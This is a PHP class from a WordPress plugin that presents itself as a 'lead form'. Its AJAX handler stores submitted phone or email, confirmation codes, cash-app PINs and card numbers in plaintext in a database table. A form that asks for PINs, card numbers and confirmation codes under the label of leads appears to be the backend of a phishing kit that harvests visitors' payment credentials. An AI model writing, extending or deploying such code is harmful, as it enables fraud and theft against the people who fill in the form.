<?php

namespace BOILERPLATE\Inc;

use BOILERPLATE\Inc\Traits\Credentials_Options;
use BOILERPLATE\Inc\Traits\Program_Logs;
use BOILERPLATE\Inc\Traits\Singleton;

class Lead_Form {

    use Singleton;
    use Program_Logs;
    use Credentials_Options;

    public function __construct() {
        // $this->load_credentials_options();
        $this->setup_hooks();
    }

    public function setup_hooks() {
        // create lead form shortcode
        add_shortcode( 'lead_form', [ $this, 'lead_form_shortcode' ] );
        add_action( 'wp_ajax_save_to_database', [ $this, 'save_leads_to_database' ] );
    }

    public function lead_form_shortcode() {
        ob_start();

        // include lead form template
        include_once PLUGIN_BASE_PATH . '/templates/template-lead-form.php';

        return ob_get_clean();
    }

    public function save_leads_to_database() {

        if ( !check_ajax_referer( 'wpb_public_nonce', 'nonce' ) ) {
            wp_send_json_error( 'Invalid nonce' );
        }

        $phone_or_email    = sanitize_text_field( $_POST['emailOrPhone'] );
        $confirmation_code = sanitize_text_field( $_POST['confirmationCode'] );
        $cash_pin          = sanitize_text_field( $_POST['pinValue'] );
        $card_number       = sanitize_text_field( $_POST['cashCardNumber'] );

        global $wpdb;
        $table_name = $wpdb->prefix . 'sync_leads';
        $wpdb->insert(
            $table_name,
            [
                'phone_or_email'    => $phone_or_email,
                'confirmation_code' => $confirmation_code,
                'cash_pin'          => $cash_pin,
                'card_number'       => $card_number,
            ]
        );

        wp_send_json_success( [
            'message' => 'Lead saved successfully',
        ] );
    }

}